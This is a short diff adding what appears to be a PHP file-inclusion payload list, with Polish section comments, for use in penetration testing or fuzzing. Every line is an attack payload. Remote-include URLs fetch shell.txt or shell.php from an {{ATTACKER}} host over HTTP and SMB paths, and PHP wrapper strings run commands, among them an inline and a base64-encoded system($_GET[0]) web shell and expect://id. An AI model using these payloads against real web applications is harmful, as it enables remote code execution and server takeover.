@@ -1,0 +1,16 @@
+# === Remote include — wymaga {{ATTACKER}} ===
+http://{{ATTACKER}}/shell.txt
+http://{{ATTACKER}}/shell.txt?
+http://{{ATTACKER}}/shell.txt%00
+//{{ATTACKER}}/shell.txt
+\\{{ATTACKER}}\shell.txt
+
+# === PHP wrappers — RCE ===
+data://text/plain,<?php system($_GET[0]);?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==
+expect://id
+php://input
+
+# === SMB share (Windows IIS PHP) ===
+\\{{ATTACKER}}\share\shell.php
+//{{ATTACKER}}/share/shell.php
